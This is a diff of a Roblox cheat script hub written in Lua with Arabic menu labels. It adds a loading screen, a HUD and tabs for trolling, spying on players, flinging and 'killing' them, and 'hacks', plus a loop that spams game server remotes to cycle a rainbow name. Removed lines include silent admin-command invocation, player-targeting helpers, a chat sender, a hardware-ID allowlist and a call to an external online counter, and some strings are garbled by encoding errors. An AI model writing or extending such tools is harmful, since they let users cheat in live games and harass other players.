+    local stroke=Instance.new("UIStroke",subtitleBg); stroke.Color=Color3.fromRGB(0,200,60); stroke.Thickness=1.5; stroke.Transparency=0.5
+
+    
+
+    local arrowL=Instance.new("TextLabel"); arrowL.Size=UDim2.new(0,40,1,0); arrowL.Position=UDim2.new(0,5,0,0)
+    arrowL.BackgroundTransparency=1; arrowL.Text="→"; arrowL.TextColor3=Color3.fromRGB(0,230,70)
+    arrowL.TextSize=20; arrowL.Font=Enum.Font.GothamBold; arrowL.TextXAlignment=Enum.TextXAlignment.Left
+    arrowL.TextTransparency=1; arrowL.ZIndex=7; arrowL.Parent=subtitleBg
+    
+    local arrowR=Instance.new("TextLabel"); arrowR.Size=UDim2.new(0,40,1,0); arrowR.Position=UDim2.new(1,-45,0,0)
+    arrowR.BackgroundTransparency=1; arrowR.Text="←"; arrowR.TextColor3=Color3.fromRGB(0,230,70)
+    arrowR.TextSize=20; arrowR.Font=Enum.Font.GothamBold; arrowR.TextXAlignment=Enum.TextXAlignment.Right
+    arrowR.TextTransparency=1; arrowR.ZIndex=7; arrowR.Parent=subtitleBg
+
+    local subtitleLbl=Instance.new("TextLabel")
+    subtitleLbl.Size=UDim2.new(1,-90,1,0); subtitleLbl.Position=UDim2.new(0,45,0,0)
+    subtitleLbl.BackgroundTransparency=1; subtitleLbl.Text="WELCOME TO SERVER"
+    subtitleLbl.TextColor3=Color3.fromRGB(0,255,80); subtitleLbl.TextSize=26
+    subtitleLbl.Font=Enum.Font.GothamBold; subtitleLbl.TextXAlignment=Enum.TextXAlignment.Center
+    subtitleLbl.TextTransparency=1; subtitleLbl.ZIndex=7; subtitleLbl.Parent=subtitleBg
+
+    
+    local line=Instance.new("Frame"); line.Size=UDim2.new(0,0,0,1); line.Position=UDim2.new(0.15,0,0.55,0); line.BackgroundColor3=Color3.fromRGB(0,230,70); line.BorderSizePixel=0; line.ZIndex=5; line.Parent=bg
+    local numLbl=Instance.new("TextLabel"); numLbl.Size=UDim2.new(0,220,0,65); numLbl.Position=UDim2.new(0.5,-110,0.58,0); numLbl.BackgroundTransparency=1; numLbl.Text="0%"; numLbl.TextColor3=Color3.fromRGB(0,255,80); numLbl.TextSize=20; numLbl.Font=Enum.Font.GothamBold; numLbl.TextXAlignment=Enum.TextXAlignment.Center; numLbl.ZIndex=6; numLbl.Parent=bg
+    local statusLbl=Instance.new("TextLabel"); statusLbl.Size=UDim2.new(0,300,0,22); statusLbl.Position=UDim2.new(0.5,-150,0.70,0); statusLbl.BackgroundTransparency=1; statusLbl.Text="جاري التحميل..."; statusLbl.TextColor3=Color3.fromRGB(100,230,100); statusLbl.TextSize=10; statusLbl.Font=Enum.Font.Gotham; statusLbl.TextXAlignment=Enum.TextXAlignment.Center; statusLbl.ZIndex=6; statusLbl.Parent=bg
+    local barBG=Instance.new("Frame"); barBG.Size=UDim2.new(0.6,0,0,5); barBG.Position=UDim2.new(0.2,0,0.80,0); barBG.BackgroundColor3=Color3.fromRGB(15,35,15); barBG.BorderSizePixel=0; barBG.ZIndex=6; barBG.Parent=bg; Instance.new("UICorner",barBG).CornerRadius=UDim.new(1,0)
+    local barFill=Instance.new("Frame"); barFill.Size=UDim2.new(0,0,1,0); barFill.BackgroundColor3=Color3.fromRGB(0,220,65); barFill.BorderSizePixel=0; barFill.ZIndex=7; barFill.Parent=barBG; Instance.new("UICorner",barFill).CornerRadius=UDim.new(1,0)
+    local glow=Instance.new("Frame"); glow.Size=UDim2.new(0,10,3,0); glow.AnchorPoint=Vector2.new(1,0.5); glow.Position=UDim2.new(1,0,0.5,0); glow.BackgroundColor3=Color3.fromRGB(180,255,180); glow.BackgroundTransparency=0.2; glow.BorderSizePixel=0; glow.ZIndex=8; glow.Parent=barFill; Instance.new("UICorner",glow).CornerRadius=UDim.new(0.5,0)
+    local brandLbl=Instance.new("TextLabel"); brandLbl.Size=UDim2.new(1,0,0,18); brandLbl.Position=UDim2.new(0,0,0.90,0); brandLbl.BackgroundTransparency=1; brandLbl.Text="TRX HUB  ·SA l TRX الدارك مع تعاون المطورين  TRX  "; brandLbl.TextColor3=Color3.fromRGB(0,170,50); brandLbl.TextSize=11; brandLbl.Font=Enum.Font.Gotham; brandLbl.TextXAlignment=Enum.TextXAlignment.Center; brandLbl.ZIndex=6; brandLbl.Parent=bg
+
+    
+    local fadeIn=TweenInfo.new(0.9,Enum.EasingStyle.Quint)
+    TweenService:Create(titleLbl,fadeIn,{TextTransparency=0}):Play()
+    TweenService:Create(titleShadow,fadeIn,{TextTransparency=0.6}):Play()
+    task.delay(0.3,function()
+        TweenService:Create(subtitleLbl,TweenInfo.new(0.6,Enum.EasingStyle.Quint),{TextTransparency=0}):Play()
+        TweenService:Create(arrowL,TweenInfo.new(0.6,Enum.EasingStyle.Quint),{TextTransparency=0}):Play()
+        TweenService:Create(arrowR,TweenInfo.new(0.6,Enum.EasingStyle.Quint),{TextTransparency=0}):Play()
     end)
-    getgenv().Cuff = {
-        Bring = false,
-        Throw = false
+    task.delay(0.35,function() TweenService:Create(line,TweenInfo.new(0.65,Enum.EasingStyle.Quint),{Size=UDim2.new(0.7,0,0,1)}):Play() end)
+
+    
+    task.spawn(function()
+        while sg and sg.Parent do
+            TweenService:Create(arrowL,TweenInfo.new(0.5,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{TextTransparency=0.6}):Play()
+            TweenService:Create(arrowR,TweenInfo.new(0.5,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{TextTransparency=0.6}):Play()
+            task.wait(0.5)
+            TweenService:Create(arrowL,TweenInfo.new(0.5,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{TextTransparency=0}):Play()
+            TweenService:Create(arrowR,TweenInfo.new(0.5,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{TextTransparency=0}):Play()
+            task.wait(0.5)
+        end
+    end)
+
+    local TOTAL=3.5; local startT=tick(); local hbConn
+    hbConn=RunService.Heartbeat:Connect(function()
+        local t=math.min((tick()-startT)/TOTAL,1)
+        numLbl.Text=math.floor(t*100).."%"; barFill.Size=UDim2.new(t,0,1,0)
+        glow.BackgroundTransparency=0.15+math.abs(math.sin(tick()*6))*0.25
+        statusLbl.Text="جاري التحميل"..string.rep(".",math.floor(tick()*2)%4)
+        if t>=1 then
+            hbConn:Disconnect(); numLbl.Text="100%"; statusLbl.Text="✓  اكتمل التحميل"; statusLbl.TextColor3=Color3.fromRGB(50,255,100)
+            task.wait(0.65)
+            local fi=TweenInfo.new(0.75,Enum.EasingStyle.Quint)
+            for _,o in ipairs({bg,dim,barBG,barFill,line}) do TweenService:Create(o,fi,{BackgroundTransparency=1}):Play() end
+            for _,o in ipairs({titleLbl,titleShadow,subtitleLbl,arrowL,arrowR,numLbl,statusLbl,brandLbl}) do TweenService:Create(o,fi,{TextTransparency=1}):Play() end
+            task.wait(0.8); stopRain(); sg:Destroy(); if onDone then onDone() end
+        end
+    end)
+end
+
+
+local function BuildMainUI()
+
+    local Window = redzlib:MakeWindow({ Name="FR HUB", SubTitle="صنع احمد  FR" })
+    
+
+
+    
+    local isRainbowActive = false 
+    local rainbowNameLoop 
+    local customRainbowText = "" 
+
+
+    
+    local rainbowList = {
+        {text = "TRX HUB", color = Color3.fromRGB(255, 0, 0)},
+        {text = "TRX HUB", color = Color3.fromRGB(255, 165, 0)},
+        {text = "TRX HUB", color = Color3.fromRGB(255, 255, 0)},
+        {text = "TRX HUB", color = Color3.fromRGB(0, 255, 0)},
+        {text = "TRX HUB", color = Color3.fromRGB(0, 255, 255)},
+        {text = "TRX HUB", color = Color3.fromRGB(0, 0, 255)},
+        {text = "TRX HUB", color = Color3.fromRGB(128, 0, 128)}
     }
-    workspace.FallenPartsDestroyHeight = - 500
-    function GetCuff()
-        local v49 = game.Players.LocalPlayer.Backpack:FindFirstChild("Cuffing", true)
-        local v50 = game.Players.LocalPlayer.Character:FindFirstChild("Cuffing", true)
-        return v49 and v49.Parent or (v50 and v50.Parent or false)
-    end
-    function SendNotify(p51, p52, p53)
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = p51,
-            Text = p52,
-            Duration = p53
-        })
-        local vu54 = Instance.new("Sound", game.Workspace)
-        vu54.SoundId = "rbxassetid://3398620867"
-        vu54.Volume = 10
-        vu54.Ended:Connect(function()
-            vu54:Destroy()
-        end)
-        local v55 = vu54
-        vu54.Play(v55)
-    end
-    function GetBomb(p56)
-        local v57, v58, v59 = ipairs(p56.Character:GetChildren())
-        while true do
-            local v60
-            v59, v60 = v57(v58, v59)
-            if v59 == nil then
-                break
-            end
-            if v60:IsA("Tool") and v60.Name == "Bomb" then
-                return v60
-            end
-        end
-        local v61, v62, v63 = ipairs(p56.Backpack:GetChildren())
-        while true do
-            local v64
-            v63, v64 = v61(v62, v63)
-            if v63 == nil then
-                break
-            end
-            if v64:IsA("Tool") and v64.Name == "Bomb" then
-                return v64
-            end
-        end
-        return nil
-    end
-    function GetDistanceFar(p65)
-        return (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - p65.Position).Magnitude
-    end
-    function GetNearPlayers(p66, p67)
-        local v68 = game:GetService("Players")
-        local v69 = {}
-        local v70 = p66.Character
-        if not v70 then
-            return v69
-        end
-        local v71 = v70:FindFirstChild("HumanoidRootPart")
-        if not v71 then
-            return v69
-        end
-        local v72, v73, v74 = ipairs(v68:GetPlayers())
-        while true do
-            local v75
-            v74, v75 = v72(v73, v74)
-            if v74 == nil then
-                break
-            end
-            if v75 ~= p66 then
-                local v76 = v75.Character
-                if v76 then
-                    local v77 = v76:FindFirstChild("HumanoidRootPart")
-                    if v77 then
-                        local v78 = (v71.Position - v77.Position).Magnitude
-                        if v78 <= p67 then
-                            table.insert(v69, {
-                                Player = v75,
-                                Distance = v78
-                            })
+
+    
+
+    local function toggleRainbowName(state)
+        isRainbowActive = state 
+
+        if isRainbowActive then
+           
+            if rainbowNameLoop then task.cancel(rainbowNameLoop) end
+            
+            local currentIndex = 1
+            rainbowNameLoop = task.spawn(function()
+            
+
+                
+                while isRainbowActive do 
+
+              
+                    pcall(function()
+                        local currentItem = rainbowList[currentIndex]
+                        local textToSend = (customRainbowText ~= "") and customRainbowText or currentItem.text
+
+                        local argsName = {"RolePlayName", textToSend}
+                        ReplicatedStorage.RE["1RPNam1eTex1t"]:FireServer(unpack(argsName))
+                        
+                        local argsColor = {"PickingRPNameColor", currentItem.color}
+                        ReplicatedStorage.RE["1RPNam1eColo1r"]:FireServer(unpack(argsColor))
+
+                        currentIndex = currentIndex + 1
+                        if currentIndex > #rainbowList then
+                            currentIndex = 1
                         end
-                    end
+                    end)
+                    task.wait(1)
                 end
+            end)
+            Notify("اسم رينبو", "تم تفعيل اسم الرينبو !", 3)
+        else
+            
+            if rainbowNameLoop then
+                task.cancel(rainbowNameLoop)
+                rainbowNameLoop = nil
             end
+            Notify("اسم رينبو", "تم إيقاف اسم الرينبو.", 3)
         end
-        table.sort(v69, function(p79, p80)
-            return p79.Distance < p80.Distance
-        end)
-        local v81, v82, v83 = ipairs(v69)
-        local v84 = {}
-        while true do
-            local v85
-            v83, v85 = v81(v82, v83)
-            if v83 == nil then
-                break
-            end
-            table.insert(v84, v85.Player)
-        end
-        return v84
     end
-    local function vu94(p86)
-        local v87 = p86:match("[\239\191\189-\239\191\189][\239\191\189-\239\191\189]")
-        local v88, v89, v90 = p86:gmatch("[%z\1-\127\239\191\189-\239\191\189][\239\191\189-\239\191\189]*")
-        local v91 = {}
-        while true do
-            v90 = v88(v89, v90)
-            if v90 == nil then
-                break
-            end
-            if v90 == " " then
-                table.insert(v91, "  ")
-            else
-                table.insert(v91, "\239\191\189" .. v90 .. "\239\191\189")
-            end
-        end
-        if not v87 then
-            return table.concat(v91)
-        end
-        local v92 = {}
-        for v93 = # v91, 1, - 1 do
-            table.insert(v92, v91[v93])
-        end
-        return table.concat(v92)
+
+
+
+
+    local function Notify(title, text, dur)
+        redzlib:Notify({ title, text, dur or 3 })
     end
-    function SetOnline()
+
+    
+    local spyEnabled=false; local spyTarget=nil; local autoSpyEnabled=false
+    local originalCameraSubject=nil; local bangEnabled=false; local faceSitEnabled=false
+    local bangTarget=nil; local foundPlayer=nil
+
+    local function resetVel()
         pcall(function()
-            getgenv().online = nil
-            local v95, v96, v97 = pairs(game:GetService("HttpService"):JSONDecode(request({
-                Url = "https://counter-7sone.onrender.com/counter",
-                Method = "GET"
-            }).Body))
-            while true do
-                local v98
-                v97, v98 = v95(v96, v97)
-                if v97 == nil then
-                    break
-                end
-                if type(v98) == "number" or type(v98) == "string" and v98:match("%d") then
-                    getgenv().online = tostring(v98)
-                end
-            end
-            getgenv().VR7.Background.Home_Section.Announce_Label_Frame.Announce_Label.Text = "\239\191\189\217\133\217\138\216\185 \216\167\217\132\216\173\217\130\217\136\217\130 \217\133\216\173\217\129\217\136\216\184\216\169 \217\132\216\179\217\138\216\177\217\129\216\177 VR7\n\216\167\217\132\217\133\216\183\217\136\216\177\217\138\217\134 \216\186\217\138\216\177 \217\133\216\179\216\164\217\136\217\132\217\138\217\134 \216\185\217\134 \216\179\217\136\216\161 \216\167\217\132\216\167\216\179\216\170\216\174\216\175\216\167\217\133.\n\n\217\134\216\170\217\133\217\134\217\137 \216\167\217\134 \217\138\216\185\216\172\216\168\217\131 \216\167\217\132\216\179\217\131\216\177\216\168\216\170." .. "\n\n" .. tostring("\239\191\189\217\132\217\133\216\179\216\170\216\174\216\175\217\133\217\138\217\134: " .. getgenv().online .. " " .. "\239\191\189\216\179\216\170\216\174\216\175\217\133 \216\167\217\136\217\134\217\132\216\167\217\138\217\134" .. utf8.char(129310, 127995))
+            local c=LocalPlayer.Character
+            if c and c:FindFirstChild("HumanoidRootPart") then c.HumanoidRootPart.Velocity=Vector3.zero end
         end)
     end
-    function Send(p99)
-        isLegacyChat = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService
-        if game.CreatorId ~= 35755428 or not string.find(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, "\239\191\189\216\167\216\170") then
-            if (game.CreatorId ~= 4001902 or not string.find(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, "Mohammad")) and (game.CreatorId ~= 14940374 or not string.find(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, "Rob")) then
-                if isLegacyChat then
-                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(p99), "All")
-                else
-                    game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(tostring(p99))
-                end
+
+
+    local sgHUD=Instance.new("ScreenGui"); sgHUD.Name="FR_HUB_HUD"; sgHUD.ResetOnSpawn=false; sgHUD.DisplayOrder=50; sgHUD.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; sgHUD.Parent=CoreGui
+
+    local rainbowOuter=Instance.new("Frame")
+    rainbowOuter.Size=UDim2.new(0,164,0,52)
+    
+    rainbowOuter.Position=UDim2.new(0.5,-82,0,10)
+    rainbowOuter.BackgroundColor3=Color3.fromRGB(0,200,80); rainbowOuter.BorderSizePixel=0; rainbowOuter.ZIndex=10; rainbowOuter.Active=true; rainbowOuter.Parent=sgHUD
+    Instance.new("UICorner",rainbowOuter).CornerRadius=UDim.new(0,12)
+
+    local hudFrame=Instance.new("Frame"); hudFrame.Size=UDim2.new(1,-6,1,-6); hudFrame.Position=UDim2.new(0,3,0,3); hudFrame.BackgroundColor3=Color3.fromRGB(6,14,6); hudFrame.BorderSizePixel=0; hudFrame.ZIndex=11; hudFrame.Parent=rainbowOuter; Instance.new("UICorner",hudFrame).CornerRadius=UDim.new(0,10)
+
+    local hudBtn=Instance.new("TextButton"); hudBtn.Size=UDim2.fromScale(1,1); hudBtn.BackgroundTransparency=1; hudBtn.Text="▼  FR HUB"; hudBtn.TextColor3=Color3.fromRGB(0,230,70); hudBtn.Font=Enum.Font.GothamBold; hudBtn.TextSize=15; hudBtn.AutoButtonColor=false; hudBtn.ZIndex=12; hudBtn.Parent=hudFrame
+
+    local rbColors={Color3.fromRGB(255,0,0),Color3.fromRGB(255,120,0),Color3.fromRGB(255,255,0),Color3.fromRGB(0,255,60),Color3.fromRGB(0,180,255),Color3.fromRGB(100,0,255),Color3.fromRGB(255,0,200)}
+    local rbIdx=1; local rbT=0
+    RunService.Heartbeat:Connect(function(dt)
+        rbT=rbT+dt*1.8
+        if rbT>=1 then rbT=0; rbIdx=(rbIdx%#rbColors)+1; TweenService:Create(rainbowOuter,TweenInfo.new(0.55,Enum.EasingStyle.Linear),{BackgroundColor3=rbColors[rbIdx]}):Play() end
+    end)
+
+
+    
+    do
+        local dragging=false; local dragStart=nil; local startPos=nil
+
+        rainbowOuter.InputBegan:Connect(function(inp)
+            if inp.UserInputType==Enum.UserInputType.MouseButton1 or inp.UserInputType==Enum.UserInputType.Touch then
+                dragging=true
+                dragStart=inp.Position
+                startPos=rainbowOuter.Position
+                inp.Changed:Connect(function()
+                    if inp.UserInputState==Enum.UserInputState.End then dragging=false end
+                end)
+            end
+        end)
+
+        UserInputService.InputChanged:Connect(function(inp)
+            if dragging and (inp.UserInputType==Enum.UserInputType.MouseMovement or inp.UserInputType==Enum.UserInputType.Touch) then
+                local delta=inp.Position-dragStart
+                local newX=startPos.X.Scale
+                local newXOff=startPos.X.Offset+delta.X
+                local newY=startPos.Y.Scale
+                local newYOff=startPos.Y.Offset+delta.Y
+                
+                local vp=Workspace.CurrentCamera.ViewportSize
+                newXOff=math.clamp(newXOff,-newX*vp.X, vp.X*(1-newX)-rainbowOuter.AbsoluteSize.X)
+                newYOff=math.clamp(newYOff,-newY*vp.Y, vp.Y*(1-newY)-rainbowOuter.AbsoluteSize.Y)
+                rainbowOuter.Position=UDim2.new(newX,newXOff,newY,newYOff)
+            end
+        end)
+
+        UserInputService.InputEnded:Connect(function(inp)
+            if inp.UserInputType==Enum.UserInputType.MouseButton1 or inp.UserInputType==Enum.UserInputType.Touch then
+                dragging=false
+            end
+        end)
+    end
+
+    hudBtn.MouseEnter:Connect(function() TweenService:Create(hudFrame,TweenInfo.new(0.12),{BackgroundColor3=Color3.fromRGB(0,40,12)}):Play() end)
+    hudBtn.MouseLeave:Connect(function() TweenService:Create(hudFrame,TweenInfo.new(0.12),{BackgroundColor3=Color3.fromRGB(6,14,6)}):Play() end)
+
+    local hubShown=true
+    local function toggleHub()
+        hubShown=not hubShown; Window:Minimize()
+        hudBtn.Text=hubShown and "▼ TRX HUB" or "▲  TRX HUB"
+        TweenService:Create(hudFrame,TweenInfo.new(0.2,Enum.EasingStyle.Back),{BackgroundColor3=hubShown and Color3.fromRGB(6,14,6) or Color3.fromRGB(0,25,8)}):Play()
+    end
+    hudBtn.Activated:Connect(toggleHub)
+    UserInputService.InputBegan:Connect(function(inp,gpe) if not gpe and inp.KeyCode==Enum.KeyCode.Insert then toggleHub() end end)
+
+
+    local InfoTab    = Window:MakeTab({Title="🏠 الرئيسية",   Icon="home"})
+    -- <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+-- أضف هذا الكود في نهاية تعريفات InfoTab
+-- =================================================================================
+
+    -- إضافة قسم جديد لميزة اسم الرينبو
+    InfoTab:AddSection("🎭 اسم فوق الراس رينبو")
+
+    -- إضافة صندوق نص لتغيير نص الرينبو
+    InfoTab:AddTextBox({
+        Name = "اكتب نص الرينبو (اختياري)",
+        PlaceholderText = "اتركه فارغًا لاستخدام النصوص الافتراضية",
+        Callback = function(text)
+            -- قم بتحديث متغير النص عندما يكتب المستخدم
+            customRainbowText = text
+            if text ~= "" then
+                Notify("اسم رينبو", "تم تحديث النص المخصص إلى: " .. text, 2)
             else
-                game:GetService("ReplicatedStorage"):FindFirstChild("Events", true):WaitForChild("SendMessage"):FireServer(p99)
-            end
-        else
-            game:GetService("ReplicatedStorage"):FindFirstChild("Event", true):WaitForChild("SendMessage"):FireServer(p99)
-            return
-        end
-    end
-    function GetRank()
-        if game:GetService("StarterGui"):FindFirstChild("HDAdminInterface") and game:GetService("StarterGui").HDAdminInterface.Enabled then
-            local v100 = game:GetService("Players").LocalPlayer.PlayerGui.HDAdminInterface.MainFrame.Pages.About.Info.m2RankName.Text
-            if v100:sub(1, 1) == "\'" and v100:sub(- 1) == "\'" then
-                return v100:sub(2, - 2)
+                Notify("اسم رينبو", "تم العودة إلى النصوص الافتراضية", 2)
             end
         end
-        return "Not Enabled"
-    end
-    function GetUserPic(p101)
-        return game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. p101 .. "&size=420x420&format=Png&isCircular=false"):match("\"imageUrl\"%s*:%s*\"([^\"]+)\"")
-    end
-    function CheckHWID()
-        local v102, v103, v104 = ipairs({
-            "57D3220E-B408-47A3-95B4-4B8063EC7EAD",
-            "d5856005-51ea-496b-8e03-74ee7f287942",
-            "2f0d1097-a47b-426d-80d6-618c7b2015fd"
-        })
-        while true do
-            local v105
-            v104, v105 = v102(v103, v104)
-            if v104 == nil then
-                break
-            end
-            if game:GetService("RbxAnalyticsService"):GetClientId() == v105 then
-                return {
-                    Value = true,
-                    ID = v105
-                }
-            end
+    })
+
+    -- إضافة زر لتفعيل وإيقاف تأثير الرينبو
+    InfoTab:AddToggle({
+        Name = "🌈 تفعيل اسم رينبو",
+        Default = false, -- يبدأ مطفأ
+        Callback = function(value)
+            -- استدعاء الدالة التي كتبناها في الخطوة 1
+            toggleRainbowName(value)
         end
-        return {
-            Value = false,
-            ID = nil
-        }
+    })
+
+-- =================================================================================
+-- انتهى الكود الذي يجب إضافته
+-- <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+    local SamlaTab   = Window:MakeTab({Title="⚔️ الصمله",     Icon="swords"})
+    local TrollTab   = Window:MakeTab({Title="🚌 التخريب",    Icon="car"})
+    local SpyTab     = Window:MakeTab({Title="👁️ المراقبة",   Icon="eye"})
+    local SkinTab    = Window:MakeTab({Title="👗 السكنات",    Icon="shirt"})
+    local FunTab     = Window:MakeTab({Title="🎮 الاستهداف",      Icon="gamepad2"})
+    local FlingTab   = Window:MakeTab({Title="💥 الفلنق",     Icon="zap"})
+    local ProtectTab = Window:MakeTab({Title="🛡️ الحماية",    Icon="shield"})
+    local KillTab    = Window:MakeTab({Title="☠️ القتل",      Icon="skull"})
+    local MusicTab   = Window:MakeTab({Title="🎵 الأغاني",    Icon="music"})
+    local TeleTab    = Window:MakeTab({Title="🌀 التنقل",     Icon="navigation"})
+    local HackTab    = Window:MakeTab({Title="💻 الهاكات",    Icon="code"})
+    local LocalTab   = Window:MakeTab({Title="🧑 اللاعب",     Icon="user"})
+
+    
+    local FaresTab   = Window:MakeTab({Title="⭐ سكربتات الدارك مع التعاون ", Icon="star"})
+
+    FaresTab:AddSection("سكربتات مميزة")
+
+    FaresTab:AddButton({
+        Name="ازاله اللاق من صنع الدارك مع التعاون ",
+        Callback=function()
+            local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+
+local originalProperties = {
+    GlobalShadows = Lighting.GlobalShadows,
+    Technology = Lighting.Technology,
+    FogEnd = Lighting.FogEnd,
+    WaterWaveSize = workspace.Terrain.WaterWaveSize,
+    WaterWaveSpeed = workspace.Terrain.WaterWaveSpeed,
+    WaterReflectance = workspace.Terrain.WaterReflectance,
+    WaterTransparency = workspace.Terrain.WaterTransparency
+}
+
+local NitroGUI = Instance.new("ScreenGui", CoreGui)
+NitroGUI.Name = "ProjectNitro"
+NitroGUI.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame", NitroGUI)
+MainFrame.Size = UDim2.new(0, 220, 0, 320)
+MainFrame.Position = UDim2.new(0, 20, 0.5, -160)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 22, 28)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+local UICorner = Instance.new("UICorner", MainFrame); UICorner.CornerRadius = UDim.new(0, 8)
+local UIStroke = Instance.new("UIStroke", MainFrame); UIStroke.Color = Color3.fromRGB(80, 80, 100); UIStroke.Thickness = 1
+
+local TitleBar = Instance.new("Frame", MainFrame)
+TitleBar.Size = UDim2.new(1, 0, 0, 30)
+TitleBar.BackgroundColor3 = Color3.fromRGB(30, 32, 40)
+TitleBar.BorderSizePixel = 0
+local TitleCorner = Instance.new("UICorner", TitleBar); TitleCorner.CornerRadius = UDim.new(0, 8)
+
+local TitleLabel = Instance.new("TextLabel", TitleBar)
+TitleLabel.Size = UDim2.new(1, 0, 1, 0)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.Text = "ANTI-LAG - By Fares"
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.TextSize = 16
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+local yOffset = 40
+local toggles = {}
+
+local function CreateToggle(parent, text, yPos)
+    local frame = Instance.new("Frame", parent)
+    frame.Size = UDim2.new(1, -20, 0, 25)
+    frame.Position = UDim2.new(0, 10, 0, yPos)
+    frame.BackgroundTransparency = 1
+
+    local button = Instance.new("TextButton", frame)
+    button.Size = UDim2.new(0, 25, 0, 25)
+    button.BackgroundColor3 = Color3.fromRGB(40, 42, 50)
+    button.Text = ""
+    local btnCorner = Instance.new("UICorner", button); btnCorner.CornerRadius = UDim.new(0, 6)
+
+    local check = Instance.new("TextLabel", button)
+    check.Name = "Check"
+    check.Size = UDim2.new(1, 0, 1, 0)
+    check.BackgroundTransparency = 1
+    check.Font = Enum.Font.GothamBold
+    check.Text = "√"
+    check.TextColor3 = Color3.fromRGB(80, 255, 130)
+    check.TextSize = 22
+    check.Visible = false
+
+    local label = Instance.new("TextLabel", frame)
+    label.Size = UDim2.new(1, -35, 1, 0)
+    label.Position = UDim2.new(0, 35, 0, 0)
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.Gotham
+    label.Text = text
+    label.TextColor3 = Color3.fromRGB(220, 220, 220)
+    label.TextSize = 15
+    label.TextXAlignment = Enum.TextXAlignment.Left
+
+    return button, check
+end
+
+
+local function AddToggle(name, text)
+    local btn, chk = CreateToggle(MainFrame, text, yOffset)
+    toggles[name] = {button = btn, check = chk, state = false}
+    yOffset = yOffset + 35
+end
+
+AddToggle("Shadows", "Remove Shadows")
+AddToggle("Effects", "Reduce Effects")
+AddToggle("Materials", "Simplify Materials")
+AddToggle("Water", "Disable Water Details")
+AddToggle("Lighting", "Optimize Lighting")
+AddToggle("Textures", "Remove Textures")
+
+local RevertButton = Instance.new("TextButton", MainFrame)
+RevertButton.Size = UDim2.new(1, -20, 0, 30)
+RevertButton.Position = UDim2.new(0, 10, 0, yOffset + 10)
+RevertButton.BackgroundColor3 = Color3.fromRGB(180, 40, 60)
+RevertButton.Font = Enum.Font.GothamBold
+RevertButton.Text = "REVERT ALL"
+RevertButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+RevertButton.TextSize = 16
+local RevertCorner = Instance.new("UICorner", RevertButton); RevertCorner.CornerRadius = UDim.new(0, 6)
+
+local function SetToggle(toggleName, state)
+    toggles[toggleName].state = state
+    toggles[toggleName].check.Visible = state
+end
+
+local function RevertAll()
+    Lighting.GlobalShadows = originalProperties.GlobalShadows
+    Lighting.Technology = originalProperties.Technology
+    Lighting.FogEnd = originalProperties.FogEnd
+    workspace.Terrain.WaterWaveSize = originalProperties.WaterWaveSize
+    workspace.Terrain.WaterWaveSpeed = originalProperties.WaterWaveSpeed
+    workspace.Terrain.WaterReflectance = originalProperties.WaterReflectance
+    workspace.Terrain.WaterTransparency = originalProperties.WaterTransparency
+    
+    for name, toggle in pairs(toggles) do
+        toggle.state = false
+        toggle.check.Visible = false
     end
-    function GetDevice()
-        return table.find({
-            Enum.Platform.IOS,
-            Enum.Platform.Android
-        }, game:GetService("UserInputService"):GetPlatform()) and "Mobile" or "PC"
+    
+    for _, part in pairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") and part:FindFirstChild("OriginalMaterial") then
+            part.Material = Enum.Material[part.OriginalMaterial.Value]
+            part.OriginalMaterial:Destroy()
+        end
+        if part:IsA("ParticleEmitter") then part.Enabled = true end
+        if part:IsA("Texture") or part:IsA("Decal") then part.Transparency = 0 end
     end
-    function Execute(p106)
-        if GetRank() and GetRank() ~= "Not Enabled" then
-            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(p106)
-            SendNotify("System TRX ", "Executed " .. command, 5)
-        else
-            SendNotify("System TRX ", "\239\191\189\217\132\216\167\216\179\217\129 \216\167\217\132\217\133\216\167\216\168 \216\186\217\138\216\177 \217\133\216\175\216\185\217\136\217\133", 5)
+end
+
+
+toggles.Shadows.button.MouseButton1Click:Connect(function()
+    SetToggle("Shadows", not toggles.Shadows.state)
+    Lighting.GlobalShadows = not toggles.Shadows.state
+end)
+
+toggles.Effects.button.MouseButton1Click:Connect(function()
+    SetToggle("Effects", not toggles.Effects.state)
+    for _, v in pairs(workspace:GetDescendants()) do
+        if v:IsA("ParticleEmitter") or v:IsA("Explosion") or v:IsA("Smoke") or v:IsA("Fire") then
+            v.Enabled = not toggles.Effects.state
         end
     end
-    function RandomChar()
-        local v107 = {}
-        for v108 = 1, math.random(1, 5) do
-            v107[v108] = string.char(math.random(32, 126))
-        end
-        return table.concat(v107)
-    end
-    function GetSofa()
-        local v109, v110, v111 = ipairs(game.Players.LocalPlayer.Backpack:GetChildren())
